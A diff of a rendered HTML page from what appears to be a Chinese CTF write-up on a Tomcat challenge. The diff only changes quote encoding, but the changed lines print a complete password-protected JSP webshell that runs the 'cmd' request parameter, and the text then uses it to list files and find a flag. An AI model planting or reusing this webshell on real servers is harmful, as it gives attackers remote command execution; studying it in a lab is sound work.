@@ -3954,12 +3954,12 @@
 </span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7"></a>Connection: close
 </span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8"></a>Upgrade-Insecure-Requests: 1
 </span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9"></a>If-Modified-Since: Thu, 20 Jun 2019 10:03:08 GMT
-</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>If-None-Match: W/&quot;5619-1561024988000&quot;
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10"></a>If-None-Match: W/"5619-1561024988000"
 </span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11"></a>Cache-Control: max-age=0
 </span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12"></a>Content-Length: 660
 </span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13"></a>
-</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a>&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
-</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>+&quot;\\n&quot;);}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;))){out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);}else{out.println(&quot;:-)&quot;);}%&gt;
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14"></a>&lt;%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%&gt;&lt;%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15"></a>+"\\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();}%&gt;&lt;%if("023".equals(request.getParameter("pwd"))&amp;&amp;!"".equals(request.getParameter("cmd"))){out.println("&lt;pre&gt;"+excuteCmd(request.getParameter("cmd"))+"&lt;/pre&gt;");}else{out.println(":-)");}%&gt;
 </span></code></pre></div></td></tr></table></div>
     <img alt="构造 webshell" src="../img/t_star_tomcat01.jpg" /></li>
 <li>此时可通过<code>http://f5b9bbe0.yunyansec.com/hack.jsp?&amp;pwd=023&amp;cmd=ls</code>远程查看文件目录下内容，发现<code>flag.txt</code><br>
